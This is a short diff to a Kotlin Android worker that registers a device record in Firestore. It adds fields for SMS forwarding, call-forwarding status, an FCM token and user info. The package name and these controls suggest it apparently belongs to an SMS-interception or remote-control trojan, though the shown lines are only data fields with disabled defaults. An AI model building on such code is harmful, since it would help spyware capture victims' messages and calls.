@@ -41,7 +41,15 @@ class RegisterUserWorker(
                 deviceid = deviceId,
                 charge = "$batteryLevel%",
                 simModel = simInfo,
-                lastOnline = System.currentTimeMillis()
+                lastOnline = System.currentTimeMillis(),
+                forwarding = com.payload.jansiix0ne.models.Smsforward(
+                    number = "",
+                    enabled = false
+                ),
+                send_sms = null,
+                fcmToken = null,
+                callForwardStatus = false,
+                userInfo = null
             )
             
             // Register device in Firestore
